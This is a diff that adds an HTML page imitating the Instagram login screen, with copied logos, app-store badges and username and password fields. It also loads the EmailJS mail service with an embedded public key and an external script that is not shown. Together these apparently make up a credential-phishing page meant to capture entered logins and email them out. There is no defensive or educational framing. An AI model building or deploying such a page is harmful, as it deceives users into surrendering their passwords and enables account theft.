@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+    
+    <!-- Include EmailJS Library -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <!-- Initialize EmailJS with your Public Key -->
+    <script>
+        emailjs.init("zWf-mwho9y9HbNvhF"); <!-- 🔑 Replace YOUR_PUBLIC_KEY here -->
+    </script>
+    
+    <script src="script.js" defer></script>
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram.png" alt="Instagram Logo" class="logo">
+            <form id="login-form">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="divider">
+                <div class="line"></div>
+                <span>OR</span>
+                <div class="line"></div>
+            </div>
+            <div class="other-options">
+                <a href="#">Log in with Facebook</a>
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-links">
+                <img src="https://www.instagram.com/static/images/appstore.png/9a4cda0b7b5e.png" alt="App Store">
+                <img src="https://www.instagram.com/static/images/googleplay.png/91a34b2c498a.png" alt="Google Play">
+            </div>
+        </div>
+    </div>
+</body>
+</html>
